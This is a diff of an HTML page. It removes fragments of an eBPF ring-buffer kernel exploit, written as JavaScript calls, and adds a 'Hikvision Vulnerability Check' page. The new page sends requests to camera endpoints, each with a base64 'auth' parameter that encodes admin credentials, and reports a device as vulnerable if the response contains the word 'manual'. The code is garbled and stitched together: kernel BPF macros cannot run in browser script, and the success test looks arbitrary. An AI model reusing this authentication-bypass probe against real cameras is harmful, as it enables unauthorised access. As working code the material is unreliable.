@@ -1,50 +1,94 @@
 ```html
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Exploit Code</title>
+    <title>Hikvision Vulnerability Check</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            margin: 0;
+            padding: 0;
+        }
+
+        .container {
+            max-width: 800px;
+            margin: 20px auto;
+            padding: 20px;
+            background-color: #fff;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+
+        h1 {
+            color: #333;
+            text-align: center;
+        }
+
+        .output {
+            margin-top: 20px;
+            padding: 10px;
+            background-color: #f9f9f9;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+
+        .success {
+            color: green;
+        }
+
+        .error {
+            color: red;
+        }
+    </style>
 </head>
+
 <body>
+    <div class="container">
+        <h1>Hikvision Vulnerability Check</h1>
+        <div class="output">
+            <p>Checking if <span id="url"></span> is vulnerable to Hikvision exploits...</p>
+        </div>
+    </div>
+
     <script>
-        const exploitContext = {
-            ringbuf_map_fd: 0,
-            a_fd: 0,
-            b_fd: 0,
-            prog_fd: 0,
-            kernel_slide: 0
+        const vulnerableEndpoints = {
+            hikvision_time: "/System/time?auth=YWRtaW46UEtTOHVpTWg1UUk4",
+            hikvision_users: "/Security/users?auth=YWRtaW46c28xWVBx",
+            hikvision_device: "/System/deviceInfo?auth=YWRtaW46a3ZEUE4",
+            hikvision_network_interfaces: "/Network/interfaces?auth=YWRtaW46OXduWA",
+            hikvision_storage: "/System/Storage/volumes?auth=YWRtaW46b0tSb0ZGNzl6"
         };
 
-        function getInvalidPointer(oob_map_fd, dest_reg, value) {
-            BPF_LD_MAP_FD(BPF_REG_1, oob_map_fd);
-            BPF_MOV64_IMM(BPF_REG_2, 0);
-            BPF_MOV64_IMM(BPF_REG_3, 0xffffffffffffffff);
-            BPF_EMIT_CALL(BPF_RINGBUF_RESERVE);
-            BPF_MOV64_REG(dest_reg, BPF_REG_0);
-            BPF_ALU64_IMM(BPF_ADD, dest_reg, value - 1);
-            BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, 0, 5);
-            BPF_MOV64_REG(BPF_REG_1, BPF_REG_0);
-            BPF_MOV64_IMM(BPF_REG_2, 0);
-            BPF_EMIT_CALL(BPF_RINGBUF_DISCARD);
-            BPF_MOV64_IMM(BPF_REG_0, 0);
-            BPF_EXIT_INSN();
-            BPF_ALU64_IMM(BPF_ADD, dest_reg, 1);
+        const endpointKeys = Object.keys(vulnerableEndpoints);
+        const targetUrl = "https://example.com";
+        const targetPort = 8080;
+        const outputElement = document.querySelector(".output");
+
+        function checkVulnerability() {
+            outputElement.innerHTML = "<p>Checking if " + targetUrl + ":" + targetPort + " is vulnerable to Hikvision exploits...</p>";
+            
+            fetch(targetUrl + ":" + targetPort + vulnerableEndpoints['hikvision_time'])
+                .then(response => response.text())
+                .then(data => {
+                    if (data.includes("manual")) {
+                        outputElement.innerHTML += "<p class='success'>Vulnerable: " + targetUrl + ":" + targetPort + "</p>";
+                    } else {
+                        outputElement.innerHTML += "<p class='error'>Not Vulnerable: " + targetUrl + ":" + targetPort + "</p>";
+                    }
+                })
+                .catch(error => {
+                    console.error("Error:", error);
+                    outputElement.innerHTML += "<p class='error'>Error checking vulnerability</p>";
+                });
         }
 
-        function getMapValuePointer(map_fd, key, dest_reg) {
-            BPF_LD_MAP_FD(BPF_REG_1, map_fd);
-            BPF_MOV64_IMM(BPF_REG_0, key);
-            BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -4);
-            BPF_MOV64_REG(BPF_REG_2, BPF_REG_10);
-            BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4);
-            BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem);
-            BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 2);
-            BPF_MOV64_IMM(BPF_REG_0, 0);
-            BPF_EXIT_INSN();
-            BPF_MOV64_REG(dest_reg, BPF_REG_0);
-        }
+        checkVulnerability();
     </script>
 </body>
+
 </html>
 ```
